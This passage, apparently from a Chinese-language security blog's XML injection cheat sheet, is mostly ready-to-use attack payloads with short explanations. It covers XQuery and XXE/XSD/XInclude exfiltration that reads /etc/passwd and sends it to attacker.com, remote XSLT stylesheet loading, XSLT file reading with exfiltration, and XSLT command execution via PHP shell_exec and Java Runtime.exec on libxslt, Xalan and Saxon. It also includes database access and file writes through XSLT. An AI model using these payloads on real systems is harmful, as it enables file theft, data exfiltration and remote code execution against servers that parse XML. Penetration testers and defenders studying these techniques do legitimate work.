class="line">        <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri($n/text()),</span><br><span class="line">        <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> $c <span class="keyword">in</span> $n/child::*</span><br><span class="line">        let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $c/@* <span class="keyword">return</span>(concat(name($c), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri($c)))</span><br><span class="line">        let $y := doc(concat(</span><br><span class="line">            <span class="string">&quot;http://attacker.com/?child=1&amp;amp;name=&quot;</span>, encode-<span class="keyword">for</span>-uri(name($c)),</span><br><span class="line">            <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri($c/text()),</span><br><span class="line">            <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">        )) </span><br></pre></td></tr></table></figure><p>Exist-DB 是一个类似 SQLite 的本地 xml 数据库，可以通过 XQuery 进行查询。不同于其他数据库，Exist-DB 使用 HTTP 接口进行查询，例如 REST, XML-RPC, WebDAV 和 SOAP。更多 XQuery 知识，参考<a href="https://www.w3school.com.cn/xquery/index.asp">w3school</a></p><h2 id="XSD 注入"><a href="#XSD 注入" class="headerlink" title="XSD 注入"></a>XSD 注入</h2><p>XSD (XML Schema Definition) 是一种用来描述 XML 文档元素的定义方法，可以用来代替 DTD，比 DTD 更加强大，功能也更多。更多 XSD 知识，请参考<a href="https://www.w3school.com.cn/schema/index.asp">w3school</a></p><h3 id="XSD-schemaLocation"><a href="#XSD-schemaLocation" class="headerlink" title="XSD schemaLocation"></a>XSD schemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ttt:data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ttt</span>=<span class="string">&quot;http://attacker.com/attack&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;ttt http://attacker.com/<span class="symbol">&amp;internal;</span>&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">ttt:data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘%payload;’&gt;</span>”&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="XSD-noNamespaceSchemaLocation"><a href="#XSD-noNamespaceSchemaLocation" class="headerlink" title="XSD noNamespaceSchemaLocation"></a>XSD noNamespaceSchemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">”http://www.w3.org/2001/XMLSchema-instance”</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">”http://attacker.com/&amp;internal;”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘%payload;’&gt;</span>”&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="XSD-Include-import"><a href="#XSD-Include-import" class="headerlink" title="XSD Include/import"></a>XSD Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">elementFormDefault</span>=<span class="string">&quot;qualified&quot;</span> <span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:myNS</span>=<span class="string">&quot;myNS&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:import</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:include</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS2&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><blockquote><p>XInclude 需要手动开启。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xi</span>=<span class="string">”http://www.w3.org/2001/XInclude”</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">”http://attacker.com/&amp;internal;”</span> <span class="attr">parse</span>=<span class="string">”text”</span>&gt;</span><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘%payload;’&gt;</span>”&gt;</span><br><span class="line">%param1;</span><br></pre></td></tr></table></figure><h3 id="XSD 报错"><a href="#XSD 报错" class="headerlink" title="XSD 报错"></a>XSD 报错</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:restriction</span> <span class="attr">base</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:pattern</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;xxe;</span>&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:restriction</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSLT 注入"><a href="#XSLT 注入" class="headerlink" title="XSLT 注入"></a>XSLT 注入</h2><p>XSLT (EXtensible Stylesheet Language Transform)，是一种扩展样式表转换语言，可以将 XML 转换为其他类型的语言。更多 XSLT 知识，请参考<a href="https://www.w3school.com.cn/xsl/index.asp">w3school</a>。</p><h3 id="获取 XSLT 信息"><a href="# 获取 XSLT 信息" class="headerlink" title="获取 XSLT 信息"></a>获取 XSLT 信息</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    XSLT Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property(&#x27;xsl:version&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor URL: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property(&#x27;xsl:version-url&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-Stylesheet"><a href="#XSLT-Stylesheet" class="headerlink" title="XSLT Stylesheet"></a>XSLT Stylesheet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">doc</span>&gt;</span><span class="tag">&lt;/<span class="name">doc</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-Include-import"><a href="#XSLT-Include-import" class="headerlink" title="XSLT Include/import"></a>XSLT Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:import</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT 读取文件"><a href="#XSLT 读取文件" class="headerlink" title="XSLT 读取文件"></a>XSLT 读取文件 </h3><p> 可读取合法的 xml 文件，或者普通文件的第一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;test.xml&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;file:///secret.txt&#x27;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>将读取到的文件发送到远程服务器中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name1&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;file:///etc/passwd&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name2&quot;</span> <span class="attr">select</span>=<span class="string">&quot;concat(&#x27;http://attacker.com/?&#x27;, $name1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name3&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document($name2)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-RCE"><a href="#XSLT-RCE" class="headerlink" title="XSLT RCE"></a>XSLT RCE</h3><p>libxslt + php 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span></span><br><span class="line">          </span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;html&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;php:function(&#x27;shell_exec&#x27;, &#x27;sleep 10&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line">xmlns:runtime=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span><br><span class="line">xmlns:process=&quot;http://xml.apache.org/xalan/java/java.lang.Process&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor($process)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty(&#x27;oname&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:jv</span>=<span class="string">&quot;http://xml.apache.org/xalan/java&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">exclude-result-prefixes</span>=<span class="string">&quot;jv&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty(&#x27;os.name&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Saxon EE 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:date</span>=<span class="string">&quot;java:java.util.Date&quot;</span> <span class="attr">xmlns:runtime</span>=<span class="string">&quot;java:java.lang.Runtime&quot;</span> <span class="attr">xmlns:process</span>=<span class="string">&quot;java:java.lang.Process&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        Date: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;date:new()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor($process)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT 连接数据库"><a href="#XSLT 连接数据库" class="headerlink" title="XSLT 连接数据库"></a>XSLT 连接数据库</h3><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">select</span>= <span class="string">&quot;&#x27;com.mysql.jdbc.Driver&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;dbUrl&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;jdbc:mysql://localhost/xslt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltuser&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;pw&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltpw&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;select test from xtable&#x27;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;dbc&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:new($driver, $dbUrl , $user, $pw)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;table&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:query($dbc, $query)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$table/*&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;sql:close($dbc)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT 写入文件"><a href="#XSLT 写入文件" class="headerlink" title="XSLT 写入文件"></a>XSLT 写入文件 </h3><p> 若写入成功，则无任何输出，写入失败则报错。</p><p>Saxon 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:result-document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:result-document</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 